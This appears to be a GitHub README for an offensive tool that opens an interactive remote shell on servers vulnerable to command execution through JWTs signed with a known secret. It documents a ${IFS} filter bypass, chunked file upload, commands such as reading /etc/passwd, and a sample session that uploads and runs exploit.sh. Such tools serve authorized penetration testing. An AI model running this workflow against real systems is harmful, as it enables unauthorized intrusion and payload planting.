# JWT RCE Forward Shell

An interactive Python shell to exploit Remote Code Execution (RCE) vulnerabilities via insecure JWT tokens.

## ⚠️ Warning

**This tool is intended for educational purposes and authorized security testing only.**

Using this tool against systems without explicit authorization is illegal. The author disclaims all responsibility for misuse.

## 📋 Description

This Python script provides an interactive shell that allows remote command execution on a vulnerable server by exploiting JWT tokens with a known secret. It includes advanced features such as directory management and file transfer.

## ✨ Features

- **Interactive shell**: Intuitive command-line interface
- **System navigation**: Functional `cd` and `pwd` commands
- **File transfer**: Binary file upload via base64 or hexadecimal
- **Filter bypass**: Uses `${IFS}` to replace spaces
- **Persistent context**: Maintains working directory between commands

## 🔧 Prerequisites

```bash
pip install requests pyjwt
```

## 📦 Installation

```bash
git clone https://github.com/your-username/jwt-rce-shell.git
cd jwt-rce-shell
pip install -r requirements.txt
```

## 🚀 Configuration

Modify the constants in the script before use:

```python
TARGET = 'http://TARGET/'      # Target URL
SECRET = "JWT_SECRET"          # Known JWT secret
```

## 💻 Usage

### Launch

```bash
python shell.py
```

### Special commands

| Command | Description | Example |
|----------|-------------|---------|
| `cd <path>` | Change directory | `cd /tmp` |
| `pwd` | Display current directory | `pwd` |
| `upload <local> [remote]` | Upload a file (base64) | `upload exploit.sh` |
| `uploadhex <local> [remote]` | Upload a file (hex) | `uploadhex payload.bin` |
| `exit` / `quit` | Exit the shell | `exit` |

### System commands

All standard Unix commands are supported:

```bash
[/tmp]$ ls -la
[/tmp]$ cat /etc/passwd
[/tmp]$ whoami
[/tmp]$ uname -a
```

## 📝 Example Session

```
============================================================
Forward shell with cd and upload support
============================================================
Special commands:
  cd <path>                    - Change directory
  upload <local> [remote]      - Upload a file (base64)
  uploadhex <local> [remote]   - Upload a file (hex)
  pwd                          - Show current directory
  exit/quit                    - Exit
============================================================

[*] Initial directory: /var/www/html

[/var/www/html]$ cd /tmp
[+] Current directory: /tmp

[/tmp]$ upload exploit.sh
[*] Uploading exploit.sh (256 bytes, 344 bytes encoded)
[*] Sending in 1 chunks...
[+] All chunks sent to /tmp/.upload_12345
[+] Upload successful!

[/tmp]$ ./exploit.sh
```

## 📄 License

This project is provided for educational purposes only. Use it responsibly.

**Reminder**: Test only on systems for which you have explicit authorization.
